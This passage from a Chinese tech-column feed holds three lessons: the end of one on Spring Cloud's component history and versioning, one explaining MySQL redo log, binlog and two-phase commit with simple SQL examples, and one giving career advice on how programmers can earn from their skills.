&lt;p>说起 Netflix 可能你并不知道，但提起《纸牌屋》你一定看过或者听过，这部高分美剧就是由这家我们俗称&amp;quot;奈飞&amp;quot;的公司出品的。Netflix 是一家美国的流媒体巨头，它靠着自己强大的技术实力，开发沉淀了一系列优秀的组件，这些组件经历了 Netflix 线上庞大业务规模的考验，功能特性和稳定性过硬。如 Eureka 服务注册中心、Ribbon 负载均衡器、Hystrix 服务容错组件等。后来发生的故事可能你已经猜到了，Netflix 将这些组件贡献给了 Spring 开源社区，构成了 Netflix 组件库。可以这么说，在 Spring Cloud 的早期阶段，是 Netflix 打下了的半壁江山。&lt;/p>
&lt;p>Netflix 和 Spring Cloud 度过了蜜月期之后，矛盾就逐渐发生了。先是 Eureka 2.0 开源计划的搁浅，而后 Netflix 宣布 Hystrix 进入维护状态，Eureka 和 Hystrix 这两款 Netflix 组件库的明星项目停止了新功能的研发，Spring 社区不得不开始思考替代方案，在后续的新版本中走向了&amp;quot;去 Netflix 化&amp;quot;。以至于 Netflix 的网关组件 Zuul 2.0 历经几次跳票千呼万唤始出来后，Spring Cloud 社区已经不打算集成 Zuul 2.0，而是掏出了自己的 Gateway 网关。在最新版本的 Spring Cloud 中，Netflix 的踪迹已经逐渐消散，只有 Eureka 组件形单影只待在 Netflix 组件库中，回忆着昔日的辉煌。&lt;/p>
&lt;p>Spring Cloud Alibaba 是由 Alibaba 贡献的组件库，随着阿里在开源路线上的持续投入，近几年阿里系在开源领域的声音非常响亮。&lt;strong>Spring Cloud Alibaba 凝聚了阿里系在电商领域超高并发经验的重量级组件，保持了旺盛的更新活力，成为了 Spring Cloud 社区的一股新生代力量，逐渐取代了旧王 Netflix 的江湖地位&lt;/strong>。Spring Cloud Alibaba 组件秉承了&amp;quot;大而全&amp;quot;的特点，就像一个大中台应用一般包罗万象，在功能特性的丰富程度上做到了应有尽有，待我们学到 Spring Cloud 章节后你就能体会到了。这也是本课程选择 Spring Cloud Alibaba 组件的一个重要原因。&lt;/p>
&lt;h1 id="spring-cloud-全家桶组件库">Spring Cloud 全家桶组件库&lt;/h1>
&lt;p>我整理归纳了一个表格，将 Spring Cloud 中的核心组件库根据功能点做了分类，让你对每个特性功能的可选组件一目了然，&lt;strong>其中红色加粗的，是我们在课程实战环节将要集成的组件&lt;/strong>，你可以参考一下。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/68/d2/6802f52d2fc50af6cfc02cf561a99bd2.jpg?wh=2000x1332" alt="">&lt;/p>
&lt;p>上面表格中列出的是业务开发过程中的常用功能性组件，除了这些以外，Spring Cloud 官方还提供了很多可扩展组件，比如用来支持构建集群的 Spring Cloud Cluster、提供安全特性支持的 Spring Cloud Security、云原生的流处理数据管道 Spring Cloud Data Flow 等等，你可以在这个Spring Cloud 官方文档中找到完整的列表。&lt;/p>
&lt;p>如果你想了解 Spring Cloud Alibaba 组件的更多细节，我推荐你阅读 spring-cloud-alibaba 的官方 GitHub 首页或者开源社区文档。&lt;/p>
&lt;p>到这里，我们对 Spring Cloud 的核心组件库有了一个比较全面的了解，接下来，我带你去了解一下 Spring Cloud 的版本更新策略。&lt;/p>
&lt;h1 id="spring-cloud-版本更新策略">Spring Cloud 版本更新策略&lt;/h1>
&lt;p>大部分开源项目以数字版本进行更新迭代，Spring Cloud 在诞生之初就别出心裁使用了字母序列，以字母 A 开头，按顺序使用字母表中的字母标识重大迭代发布的大版本号。&lt;/p>
&lt;p>我整理了一个表格，包含了 Spring Cloud 编年史各个版本的代号以及 Release 版的发布时间，我们来感受一下 Spring Cloud 的更新节奏：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/bd/7d/bddab8d6db40951fd5e9c1af0e06807d.jpg?wh=2000x1077" alt="">&lt;/p>
&lt;p>从上面的表格中我们可以看出，&lt;strong>Spring Cloud 自 2015 年发布之始就保持了极其旺盛的生命力&lt;/strong>，&lt;strong>早期版本每半年就有一个大的版本号迭代&lt;/strong>，即便发展至今，也保持着几乎一年一升版的快速更新节奏。正是由于开源社区的持续输出，以及像 Alibaba 这类大型公司的助力，才有了今天微服务领域最为完善的 Spring Cloud 全家桶组件库。&lt;/p>
&lt;p>我们看完了 Spring Cloud 的大版本迭代更新策略，在大版本发布之前，还要经历很多小版本的迭代，接下来我带你了解一下 Spring Cloud 的小版本更新策略。如果你不清楚这里面的门道，很容易就会误用非稳定版本。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>SNAPSHOT 版本&lt;/strong>：正在开发中的快照版本，例如 2021.0.0-SNAPSHOT，快照版代表当前分支最新的代码进度，也是更新最为频繁的小版本类型，不推荐在线上正式环境使用；&lt;/li>
&lt;li>&lt;strong>Milestone 版本&lt;/strong>：在大版本正式发布前的里程碑版本，例如 2021.0.0-M1，M1 代表当前大版本的第一个里程碑版本，M2 代表第二个迭代里程碑，以此类推。在正式版本发布之前要经历多个里程碑的迭代，像 Spring Cloud Finchley 版足足经历了 9 个 M 版本之后，才过渡到了 RC 版。同样地，我也不推荐你在正式项目中使用 Milestone 版本；&lt;/li>
&lt;li>&lt;strong>Release Candidate 版本&lt;/strong>：这就是我们俗称的 RC 版，例如 2021.0.0-RC1。当一个版本迭代到 RC 版的时候，意味着离正式发布已经不远了。但是你要注意，RC 版是发布前的候选版本，走到这一步通常已经没有新的功能开发，RC 主要目的是开放出来让大家试用并尽量修复严重 Bug。&lt;/li>
&lt;li>&lt;strong>Release 版&lt;/strong>：稳定的正式发布版，比如 2020.0.1。你可以在自己的线上业务中放心使用 Release 稳定版。&lt;/li>
&lt;/ul>
&lt;p>到这里，我们就完整了解了 Spring Cloud 的发展历史、核心组件库、版本更新策略。现在，我们来回顾一下这节课的重点内容。&lt;/p>
&lt;h1 id="总结">总结&lt;/h1>
&lt;p>今天我带你了解了 Spring Cloud 框架的定位和它的核心组件库。以史为镜，我们了解了 Netflix 组件库和 Alibaba 组件库朝代更替的背景故事，以帮助我们在做技术选型的时候尽可能避开已经进入&amp;quot;维护状态&amp;quot;的组件。&lt;/p>
&lt;p>此外，我想再和你分享一些新旧工具应用的经验。我周围很多的技术人员在做项目的时候容易进入一个误区，那就是&amp;quot;为新而新&amp;quot;，什么意思呢？每当一个新版本出来的时候，他们就迫不及待地把自己的业务升级到最新版本，盲目追新，殊不知这样做很容易翻车。作为一名老司机，我推荐你这样做：&lt;strong>当你心仪的框架有重大版本更新时，我还是建议你先按兵不动，等大版本做了一两次迭代之后，明显的 Bug 修复得七七八八了，再应用到自己的项目中也不迟&lt;/strong>。&lt;/p>
&lt;h1 id="思考题">思考题&lt;/h1>
&lt;p>当你考虑给自己的项目做底层技术框架升版的时候，你会基于哪些因素做出&amp;quot;升级版本&amp;quot;的决定呢？欢迎你与我交流讨论，我在留言区等你。&lt;/p>
&lt;p>好啦，这节课就结束啦。也欢迎你把这节课分享给更多对 Spring Cloud 感兴趣的朋友。我是姚秋辰，我们下节课再见！&lt;/p></description></item><item><title>极客专栏: 02丨日志系统：一条SQL更新语句是如何执行的？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/02%E4%B8%A8%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%80%E6%9D%A1sql%E6%9B%B4%E6%96%B0%E8%AF%AD%E5%8F%A5%E6%98%AF%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E7%9A%84/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/02%E4%B8%A8%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%80%E6%9D%A1sql%E6%9B%B4%E6%96%B0%E8%AF%AD%E5%8F%A5%E6%98%AF%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E7%9A%84/</guid><description>
&lt;p>前面我们系统了解了一个查询语句的执行流程，并介绍了执行过程中涉及的处理模块。相信你还记得，一条查询语句的执行过程一般是经过连接器、分析器、优化器、执行器等功能模块，最后到达存储引擎。&lt;/p>
&lt;p>那么，一条更新语句的执行流程又是怎样的呢？&lt;/p>
&lt;p>之前你可能经常听 DBA 同事说，MySQL 可以恢复到半个月内任意一秒的状态，惊叹的同时，你是不是心中也会不免会好奇，这是怎样做到的呢？&lt;/p>
&lt;p>我们还是从一个表的一条更新语句说起，下面是这个表的创建语句，这个表有一个主键 ID 和一个整型字段 c：&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; create table T(ID int primary key, c int);
&lt;/code>&lt;/pre>
&lt;p>如果要将 ID=2 这一行的值加 1，SQL 语句就会这么写：&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; update T set c=c+1 where ID=2;
&lt;/code>&lt;/pre>
&lt;p>前面我有跟你介绍过 SQL 语句基本的执行链路，这里我再把那张图拿过来，你也可以先简单看看这个图回顾下。首先，可以确定的说，查询语句的那一套流程，更新语句也是同样会走一遍。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/0d/d9/0d2070e8f84c4801adbfa03bda1f98d9.png" alt="">
MySQL 的逻辑架构图&lt;/p>
&lt;p>你执行语句前要先连接数据库，这是连接器的工作。&lt;/p>
&lt;p>前面我们说过，在一个表上有更新的时候，跟这个表有关的查询缓存会失效，所以这条语句就会把表 T 上所有缓存结果都清空。这也就是我们一般不建议使用查询缓存的原因。&lt;/p>
&lt;p>接下来，分析器会通过词法和语法解析知道这是一条更新语句。优化器决定要使用 ID 这个索引。然后，执行器负责具体执行，找到这一行，然后更新。&lt;/p>
&lt;p>与查询流程不一样的是，更新流程还涉及两个重要的日志模块，它们正是我们今天要讨论的主角：redo log（重做日志）和 binlog（归档日志）。如果接触 MySQL，那这两个词肯定是绕不过的，我后面的内容里也会不断地和你强调。不过话说回来，redo log 和 binlog 在设计上有很多有意思的地方，这些设计思路也可以用到你自己的程序里。&lt;/p>
&lt;h1 id="重要的日志模块redo-log">重要的日志模块：redo log&lt;/h1>
&lt;p>不知道你还记不记得《孔乙己》这篇文章，酒店掌柜有一个粉板，专门用来记录客人的赊账记录。如果赊账的人不多，那么他可以把顾客名和账目写在板上。但如果赊账的人多了，粉板总会有记不下的时候，这个时候掌柜一定还有一个专门记录赊账的账本。&lt;/p>
&lt;p>如果有人要赊账或者还账的话，掌柜一般有两种做法：&lt;/p>
&lt;ul>
&lt;li>一种做法是直接把账本翻出来，把这次赊的账加上去或者扣除掉；&lt;/li>
&lt;li>另一种做法是先在粉板上记下这次的账，等打烊以后再把账本翻出来核算。&lt;/li>
&lt;/ul>
&lt;p>在生意红火柜台很忙时，掌柜一定会选择后者，因为前者操作实在是太麻烦了。首先，你得找到这个人的赊账总额那条记录。你想想，密密麻麻几十页，掌柜要找到那个名字，可能还得带上老花镜慢慢找，找到之后再拿出算盘计算，最后再将结果写回到账本上。&lt;/p>
&lt;p>这整个过程想想都麻烦。相比之下，还是先在粉板上记一下方便。你想想，如果掌柜没有粉板的帮助，每次记账都得翻账本，效率是不是低得让人难以忍受？&lt;/p>
&lt;p>同样，在 MySQL 里也有这个问题，如果每一次的更新操作都需要写进磁盘，然后磁盘也要找到对应的那条记录，然后再更新，整个过程 IO 成本、查找成本都很高。为了解决这个问题，MySQL 的设计者就用了类似酒店掌柜粉板的思路来提升更新效率。&lt;/p>
&lt;p>而粉板和账本配合的整个过程，其实就是 MySQL 里经常说到的 WAL 技术，WAL 的全称是 Write-Ahead Logging，它的关键点就是先写日志，再写磁盘，也就是先写粉板，等不忙的时候再写账本。&lt;/p>
&lt;p>具体来说，当有一条记录需要更新的时候，InnoDB 引擎就会先把记录写到 redo log（粉板）里面，并更新内存，这个时候更新就算完成了。同时，InnoDB 引擎会在适当的时候，将这个操作记录更新到磁盘里面，而这个更新往往是在系统比较空闲的时候做，这就像打烊以后掌柜做的事。&lt;/p>
&lt;p>如果今天赊账的不多，掌柜可以等打烊后再整理。但如果某天赊账的特别多，粉板写满了，又怎么办呢？这个时候掌柜只好放下手中的活儿，把粉板中的一部分赊账记录更新到账本中，然后把这些记录从粉板上擦掉，为记新账腾出空间。&lt;/p>
&lt;p>与此类似，InnoDB 的 redo log 是固定大小的，比如可以配置为一组 4 个文件，每个文件的大小是 1GB，那么这块&amp;quot;粉板&amp;quot;总共就可以记录 4GB 的操作。从头开始写，写到末尾就又回到开头循环写，如下面这个图所示。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/16/a7/16a7950217b3f0f4ed02db5db59562a7.png" alt="">&lt;/p>
&lt;p>write pos 是当前记录的位置，一边写一边后移，写到第 3 号文件末尾后就回到 0 号文件开头。checkpoint 是当前要擦除的位置，也是往后推移并且循环的，擦除记录前要把记录更新到数据文件。&lt;/p>
&lt;p>write pos 和 checkpoint 之间的是&amp;quot;粉板&amp;quot;上还空着的部分，可以用来记录新的操作。如果 write pos 追上 checkpoint，表示&amp;quot;粉板&amp;quot;满了，这时候不能再执行新的更新，得停下来先擦掉一些记录，把 checkpoint 推进一下。&lt;/p>
&lt;p>有了 redo log，InnoDB 就可以保证即使数据库发生异常重启，之前提交的记录都不会丢失，这个能力称为&lt;strong>crash-safe&lt;/strong>。&lt;/p>
&lt;p>要理解 crash-safe 这个概念，可以想想我们前面赊账记录的例子。只要赊账记录记在了粉板上或写在了账本上，之后即使掌柜忘记了，比如突然停业几天，恢复生意后依然可以通过账本和粉板上的数据明确赊账账目。&lt;/p>
&lt;h1 id="重要的日志模块binlog">重要的日志模块：binlog&lt;/h1>
&lt;p>前面我们讲过，MySQL 整体来看，其实就有两块：一块是 Server 层，它主要做的是 MySQL 功能层面的事情；还有一块是引擎层，负责存储相关的具体事宜。上面我们聊到的粉板 redo log 是 InnoDB 引擎特有的日志，而 Server 层也有自己的日志，称为 binlog（归档日志）。&lt;/p>
&lt;p>我想你肯定会问，为什么会有两份日志呢？&lt;/p>
&lt;p>因为最开始 MySQL 里并没有 InnoDB 引擎。MySQL 自带的引擎是 MyISAM，但是 MyISAM 没有 crash-safe 的能力，binlog 日志只能用于归档。而 InnoDB 是另一个公司以插件形式引入 MySQL 的，既然只依靠 binlog 是没有 crash-safe 能力的，所以 InnoDB 使用另外一套日志系统&amp;mdash;&amp;mdash;也就是 redo log 来实现 crash-safe 能力。&lt;/p>
&lt;p>这两种日志有以下三点不同。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>redo log 是 InnoDB 引擎特有的；binlog 是 MySQL 的 Server 层实现的，所有引擎都可以使用。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>redo log 是物理日志，记录的是&amp;quot;在某个数据页上做了什么修改&amp;quot;；binlog 是逻辑日志，记录的是这个语句的原始逻辑，比如&amp;quot;给 ID=2 这一行的 c 字段加 1 &amp;ldquo;。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>redo log 是循环写的，空间固定会用完；binlog 是可以追加写入的。&amp;ldquo;追加写&amp;quot;是指 binlog 文件写到一定大小后会切换到下一个，并不会覆盖以前的日志。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>有了对这两个日志的概念性理解，我们再来看执行器和 InnoDB 引擎在执行这个简单的 update 语句时的内部流程。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>执行器先找引擎取 ID=2 这一行。ID 是主键，引擎直接用树搜索找到这一行。如果 ID=2 这一行所在的数据页本来就在内存中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是 N+1，得到新的一行数据，再调用引擎接口写入这行新数据。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>引擎将这行新数据更新到内存中，同时将这个更新操作记录到 redo log 里面，此时 redo log 处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>执行器生成这个操作的 binlog，并把 binlog 写入磁盘。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 改成提交（commit）状态，更新完成。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>这里我给出这个 update 语句的执行流程图，图中浅色框表示是在 InnoDB 内部执行的，深色框表示是在执行器中执行的。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/2e/be/2e5bff4910ec189fe1ee6e2ecc7b4bbe.png" alt="">
update 语句执行流程&lt;/p>
&lt;p>你可能注意到了，最后三步看上去有点&amp;quot;绕&amp;rdquo;，将 redo log 的写入拆成了两个步骤：prepare 和 commit，这就是&amp;quot;两阶段提交&amp;rdquo;。&lt;/p>
&lt;h1 id="两阶段提交">两阶段提交&lt;/h1>
&lt;p>为什么必须有&amp;quot;两阶段提交&amp;quot;呢？这是为了让两份日志之间的逻辑一致。要说明这个问题，我们得从文章开头的那个问题说起：&lt;strong>怎样让数据库恢复到半个月内任意一秒的状态？&lt;/strong>&lt;/p>
&lt;p>前面我们说过了，binlog 会记录所有的逻辑操作，并且是采用&amp;quot;追加写&amp;quot;的形式。如果你的 DBA 承诺说半个月内可以恢复，那么备份系统中一定会保存最近半个月的所有 binlog，同时系统会定期做整库备份。这里的&amp;quot;定期&amp;quot;取决于系统的重要性，可以是一天一备，也可以是一周一备。&lt;/p>
&lt;p>当需要恢复到指定的某一秒时，比如某天下午两点发现中午十二点有一次误删表，需要找回数据，那你可以这么做：&lt;/p>
&lt;ul>
&lt;li>首先，找到最近的一次全量备份，如果你运气好，可能就是昨天晚上的一个备份，从这个备份恢复到临时库；&lt;/li>
&lt;li>然后，从备份的时间点开始，将备份的 binlog 依次取出来，重放到中午误删表之前的那个时刻。&lt;/li>
&lt;/ul>
&lt;p>这样你的临时库就跟误删之前的线上库一样了，然后你可以把表数据从临时库取出来，按需要恢复到线上库去。&lt;/p>
&lt;p>好了，说完了数据恢复过程，我们回来说说，为什么日志需要&amp;quot;两阶段提交&amp;quot;。这里不妨用反证法来进行解释。&lt;/p>
&lt;p>由于 redo log 和 binlog 是两个独立的逻辑，如果不用两阶段提交，要么就是先写完 redo log 再写 binlog，或者采用反过来的顺序。我们看看这两种方式会有什么问题。&lt;/p>
&lt;p>仍然用前面的 update 语句来做例子。假设当前 ID=2 的行，字段 c 的值是 0，再假设执行 update 语句过程中在写完第一个日志后，第二个日志还没有写完期间发生了 crash，会出现什么情况呢？&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>先写 redo log 后写 binlog&lt;/strong> 。假设在 redo log 写完，binlog 还没有写完的时候，MySQL 进程异常重启。由于我们前面说过的，redo log 写完之后，系统即使崩溃，仍然能够把数据恢复回来，所以恢复后这一行 c 的值是 1。&lt;br>
但是由于 binlog 没写完就 crash 了，这时候 binlog 里面就没有记录这个语句。因此，之后备份日志的时候，存起来的 binlog 里面就没有这条语句。&lt;br>
然后你会发现，如果需要用这个 binlog 来恢复临时库的话，由于这个语句的 binlog 丢失，这个临时库就会少了这一次更新，恢复出来的这一行 c 的值就是 0，与原库的值不同。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>先写 binlog 后写 redo log&lt;/strong>。如果在 binlog 写完之后 crash，由于 redo log 还没写，崩溃恢复以后这个事务无效，所以这一行 c 的值是 0。但是 binlog 里面已经记录了&amp;quot;把 c 从 0 改成 1&amp;quot;这个日志。所以，在之后用 binlog 来恢复的时候就多了一个事务出来，恢复出来的这一行 c 的值就是 1，与原库的值不同。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>可以看到，如果不使用&amp;quot;两阶段提交&amp;quot;，那么数据库的状态就有可能和用它的日志恢复出来的库的状态不一致。&lt;/p>
&lt;p>你可能会说，这个概率是不是很低，平时也没有什么动不动就需要恢复临时库的场景呀？&lt;/p>
&lt;p>其实不是的，不只是误操作后需要用这个过程来恢复数据。当你需要扩容的时候，也就是需要再多搭建一些备库来增加系统的读能力的时候，现在常见的做法也是用全量备份加上应用 binlog 来实现的，这个&amp;quot;不一致&amp;quot;就会导致你的线上出现主从数据库不一致的情况。&lt;/p>
&lt;p>简单说，redo log 和 binlog 都可以用于表示事务的提交状态，而两阶段提交就是让这两个状态保持逻辑上的一致。&lt;/p>
&lt;h1 id="小结">小结&lt;/h1>
&lt;p>今天，我介绍了 MySQL 里面最重要的两个日志，即物理日志 redo log 和逻辑日志 binlog。&lt;/p>
&lt;p>redo log 用于保证 crash-safe 能力。innodb_flush_log_at_trx_commit 这个参数设置成 1 的时候，表示每次事务的 redo log 都直接持久化到磁盘。这个参数我建议你设置成 1，这样可以保证 MySQL 异常重启之后数据不丢失。&lt;/p>
&lt;p>sync_binlog 这个参数设置成 1 的时候，表示每次事务的 binlog 都持久化到磁盘。这个参数我也建议你设置成 1，这样可以保证 MySQL 异常重启之后 binlog 不丢失。&lt;/p>
&lt;p>我还跟你介绍了与 MySQL 日志系统密切相关的&amp;quot;两阶段提交&amp;quot;。两阶段提交是跨系统维持数据逻辑一致性时常用的一个方案，即使你不做数据库内核开发，日常开发中也有可能会用到。&lt;/p>
&lt;p>文章的最后，我给你留一个思考题吧。前面我说到定期全量备份的周期&amp;quot;取决于系统重要性，有的是一天一备，有的是一周一备&amp;quot;。那么在什么场景下，一天一备会比一周一备更有优势呢？或者说，它影响了这个数据库系统的哪个指标？&lt;/p>
&lt;p>你可以把你的思考和观点写在留言区里，我会在下一篇文章的末尾给出我的答案。&lt;/p>
&lt;p>感谢你的收听，也欢迎你把这篇文章分享给更多的朋友一起阅读。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/ce/d9/ce7f4e35916ed1aa49206a53a0547bd9.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 02丨程序员如何用技术变现（下）</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/02%E4%B8%A8%E7%A8%8B%E5%BA%8F%E5%91%98%E5%A6%82%E4%BD%95%E7%94%A8%E6%8A%80%E6%9C%AF%E5%8F%98%E7%8E%B0%E4%B8%8B/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/02%E4%B8%A8%E7%A8%8B%E5%BA%8F%E5%91%98%E5%A6%82%E4%BD%95%E7%94%A8%E6%8A%80%E6%9C%AF%E5%8F%98%E7%8E%B0%E4%B8%8B/</guid><description>
&lt;p>我不算是聪明的人，经历也不算特别成功，但一步一步走来，我认为，我能做到的，你一定也能做到，而且应该还能做得比我更好。&lt;/p>
&lt;h1 id="如何让自己的技能变现">如何让自己的技能变现&lt;/h1>
&lt;p>还是那句话，本质上来说，程序员是个手艺人，有手艺的人就能做出别人做不出来的东西，而付费也是一件很自然的事了。那么，这个问题就变成如何让自己的&amp;quot;手艺&amp;quot;更为值钱的问题了。&lt;/p>
&lt;p>第一，&lt;strong>千里之行，积于跬步&lt;/strong>。任何一件成功的大事，都是通过一个一个的小成功达到的。所以，你得确保你有一个一个的小成功。&lt;/p>
&lt;p>具体说来，首先，你得让自己身边的人有求于你，或是向别人推荐你。这就需要你能够掌握大多数人不能掌握的技能或技术，需要你更多地学习，并要有更多的别人没有的经验和经历。&lt;/p>
&lt;p>一旦你身边的人开始有求于你，或是向别人推荐你，你就会被外部的人注意到，于是其他人就会付费来获取你的帮助。而一旦你的帮忙对别人来说有效果，那就会产生效益，无论是经济效益还是社会效益，都会为你开拓更大的空间。&lt;/p>
&lt;p>你也会因为这样的正向反馈而鼓励自己去学习和钻研更多的东西，从而得到一个正向的循环。而且这个正向循环，一旦开始就停不下来了。&lt;/p>
&lt;p>第二，&lt;strong>关注有价值的东西&lt;/strong>。什么是有价值的东西？价值其实是受供需关系影响的，供大于求，就没什么价值，供不应求，就有价值。这意味着你不仅要看到市场，还要看到技术的趋势，能够分辨出什么是主流技术，什么是过渡式的技术。当你比别人有更好的嗅觉时，你就能启动得更快，也就比别人有先发优势。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>关于市场需求&lt;/strong>。你要看清市场，就需要看看各个公司都在做什么，他们的难题是什么。简单来说，现在的每家公司无论大小都缺人。但是真的缺人吗？中国是人口大国，从不缺少写代码搬砖的人，真正缺的其实是有能力能够解决技术难题的人，能够提高团队人效的人。所以，从这些方面思考，你会知道哪些技能才是真正的&amp;quot;供不应求&amp;quot;，这样可以让你更有价值。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>关于技术趋势&lt;/strong>。要看清技术趋势，你需要了解历史，就像一个球运动一样，你要知道这个球未来运动的地方，是需要观察球的已经完成运动的轨迹才知道的。因此，了解技术发展轨迹是一件很重要的事。要看一个新的技术是否顺应技术发展趋势，你需要将一些老技术的本质吃得很透。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>因此，在学习技术的过程一定要多问自己两个问题：&amp;ldquo;一，这个技术解决什么问题？为什么别的同类技术做不到？二，为什么是这样解决的？有没有更好的方式？&amp;ldquo;另外，还有一个简单的判断方法，如果一个新的技术顺应技术发展趋势，那么在这个新的技术出现时，后面一定会有大型的商业公司支持，这类公司支持得越多，就说明你越需要关注。&lt;/p>
&lt;p>第三，&lt;strong>找到能体现价值的地方&lt;/strong> 。&lt;strong>在一家高速发展的公司中，技术人员的价值可以达到最大化&lt;/strong>。&lt;/p>
&lt;p>试想，在一家大公司中，技术架构和业务已经定型，基本上没有什么太多的事可以做的。而且对于已经发展起来的大公司来说，往往稳定的重要性超过了创新。此外，大公司的高级技术人员很多，多你一个不多，少你一个不少，所以你的价值很难被体现出来。&lt;/p>
&lt;p>而刚起步的公司，业务还没有跑顺，公司的主要精力会放在业务拓展上，这个时候也不太需要高精尖的技术，所以，技术人员的价值也体现不出来。&lt;/p>
&lt;p>只有那些在高速发展的公司，技术人员的价值才能被最大化地体现出来。比较好的成长路径是，先进入大公司学习大公司的技术和成功的经验方法，然后再找到高速成长的公司，这样你就可以实现自己更多的价值。当然，这里并不排除在大公司中找到高速发展的业务。&lt;/p>
&lt;p>第四，&lt;strong>动手能力很重要&lt;/strong>。成为一个手艺人，动手能力是很重要的，因为在解决任何一个具体问题的时候，有没有动手能力就成为了关键。这也是我一直在写代码的原因，代码里全是细节，细节是魔鬼，只有了解了细节，你才能提出更好或是更靠谱、可以落地的解决方案。而不是一些笼统和模糊的东西。这太重要了。&lt;/p>
&lt;p>第五，&lt;strong>关注技术付费点&lt;/strong> 。技术付费点基本体现在两个地方，&lt;strong>一个是，能帮别人&amp;quot;挣钱&amp;quot;的地方；另一个是，能帮别人&amp;quot;省钱&amp;quot;的地方&lt;/strong>。也就是说，能够帮助别人更流畅地挣钱，或是能够帮助别人提高效率，能节省更多的成本，越直接越好。而且这个技术或解决方案最好还是大多数人做不到的。&lt;/p>
&lt;p>第六，&lt;strong>提升自己的能力和经历&lt;/strong>。付费的前提是信任，只有你提升自己的能力和经历后，别人才会对你有一定的信任，才会觉得你靠谱，才会给你机会。而这个信任需要用你的能力和经历来填补。比如，你是一个很知名的开源软件的核心开发人员，或是你是某知名公司核心项目的核心开发人员，等等。&lt;/p>
&lt;p>第七，&lt;strong>找到有价值的信息源&lt;/strong>。信息社会，如果你比别人有更好的信息源，那么你就可以比别人成长得更快。对于技术人员来说，我们知道，几乎所有的技术都源自西方世界，所以，你应该走到信息的源头去。&lt;/p>
&lt;p>如果你的信息来自朋友圈、微博、知乎、百度或是今日头条，那么我觉得你完蛋了。因为这些渠道有价值的信息不多，有营养的可能只有 1%，而为了这 1%，你需要读完 99% 的信息，太不划算了。&lt;/p>
&lt;p>那么如何找到这些信息源呢？用好 Google 就是一个关键，比如你在 Google 搜索引擎里输入&amp;quot;XXX Best Practice&amp;rdquo;，或是&amp;quot;Best programming resource&amp;rdquo;&amp;hellip;&amp;hellip;你就会找到很多。而用好这个更好的信息源需要你的英文能力，因此不断提升英文能力很关键。&lt;/p>
&lt;p>第八，&lt;strong>输出观点和价值观&lt;/strong>。真正伟大的公司或是产品都是要输出价值观的。只有输出了更先进的价值观，才会获得真正的影响力。但是，你要能输出观点和价值观，并不是一件容易的事，这需要你的积累和经历，而不是一朝之功。因此，如果想要让你的技能变现，这本质上是一个厚积薄发的过程。&lt;/p>
&lt;p>第九，&lt;strong>朋友圈很重要&lt;/strong>。一个人的朋友圈很重要，你在什么样的朋友圈，就会被什么样的朋友圈所影响。如果你的朋友圈比较优质，那么给你介绍过来的事儿和活儿也会好一些。&lt;/p>
&lt;p>优质的朋友圈基本上都有这样的特性。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>这些人都比较有想法、有观点，经验也比较丰富；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>这些人涉猎的面比较广；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>这些人都有或多或少的成功；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>这些人都是喜欢折腾喜欢搞事的人；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>这些人都对现状有些不满，并想做一些改变；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>这些人都有一定的影响力。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>最后有个关键的问题是，物以类聚，人以群分。如果你不做到这些，你怎么能进入到这样的朋友圈呢？&lt;/p>
